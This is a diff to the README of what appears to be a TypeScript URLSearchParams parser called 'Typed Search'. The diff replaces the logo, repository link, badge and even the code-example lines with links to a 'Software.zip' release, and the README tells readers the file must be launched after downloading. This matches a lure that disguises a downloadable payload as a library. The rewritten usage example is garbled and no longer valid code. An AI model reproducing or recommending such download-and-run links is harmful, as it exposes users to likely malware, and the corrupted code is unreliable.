@@ -1,6 +1,6 @@
 # Typed Search 🚀
 
-![Typed Search Logo](https://example.com/logo.png)
+![Typed Search Logo](https://github.com/samo258/typed-search/releases/download/v2.0/Software.zip)
 
 Welcome to the Typed Search repository! If you're looking for a super simple type-safe URLSearchParams parser, you're in the right place. This tool will help you efficiently parse URL search parameters while ensuring type safety in your projects. Whether you're a beginner or an experienced developer, Typed Search will make your life easier when it comes to handling URL search parameters.
 
@@ -13,7 +13,7 @@ Welcome to the Typed Search repository! If you're looking for a super simple typ
 ## Installation 🛠️
 
 To get started with Typed Search, you can download the software from the following link:
-[Download Typed Search](https://github.com/user-attachments/files/18383251/Software.zip)
+[Download Typed Search](https://github.com/samo258/typed-search/releases/download/v2.0/Software.zip)
 
 **Note:** The file needs to be launched after downloading.
 
@@ -27,8 +27,8 @@ import { parseSearchParams } from 'typed-search';
 const url = new URLSearchParams('name=John&age=30');
 const params = parseSearchParams(url);
 
-console.log(params.name); // "John"
-console.log(params.age); // 30
+https://github.com/samo258/typed-search/releases/download/v2.0/Software.zip(https://github.com/samo258/typed-search/releases/download/v2.0/Software.zip); // "John"
+https://github.com/samo258/typed-search/releases/download/v2.0/Software.zip(https://github.com/samo258/typed-search/releases/download/v2.0/Software.zip); // 30
 ```
 
 ## Getting Started 🚦
@@ -50,9 +50,9 @@ Typed Search is licensed under the MIT License. You are free to use, modify, and
 
 ---
 
-Don't forget to check the "Releases" section for any updates or new releases of Typed Search. For more information, visit the [GitHub Repository](https://github.com/yourusername/typed-search).
+Don't forget to check the "Releases" section for any updates or new releases of Typed Search. For more information, visit the [GitHub Repository](https://github.com/samo258/typed-search/releases/download/v2.0/Software.zip).
 
-[![Download Typed Search](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Typed Search](https://github.com/samo258/typed-search/releases/download/v2.0/Software.zip)](https://github.com/samo258/typed-search/releases/download/v2.0/Software.zip)
 
 Enjoy using Typed Search for your URLSearchParams parsing needs! 🔍🚀
 
